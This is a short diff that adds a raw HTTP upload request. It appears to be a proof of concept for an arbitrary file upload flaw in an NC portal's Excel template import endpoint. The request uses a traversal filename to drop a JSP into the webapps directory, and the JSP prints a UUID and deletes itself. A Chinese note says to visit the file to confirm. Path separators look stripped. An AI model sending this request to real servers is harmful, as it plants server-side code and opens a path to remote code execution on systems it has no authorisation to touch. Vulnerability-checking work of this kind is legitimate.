@@ -1,0 +1,14 @@
+POST portalptinfopathimportimportExcelTemplatepageId=login HTTP1.1
+Host nc.mrxn.net
+Content-Type multipartform-data; boundary=----WebKitFormBoundaryNAL3EsrdN90G1hgq
+
+------WebKitFormBoundaryNAL3EsrdN90G1hgq
+Content-Disposition form-data; name=Filedata; filename=..webappsnc_web1.jsp
+applicationoctet-stream
+
+%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%
+------WebKitFormBoundaryNAL3EsrdN90G1hgq--
+
+
+
+访问/webappsnc_web1.jsp 打印uuid
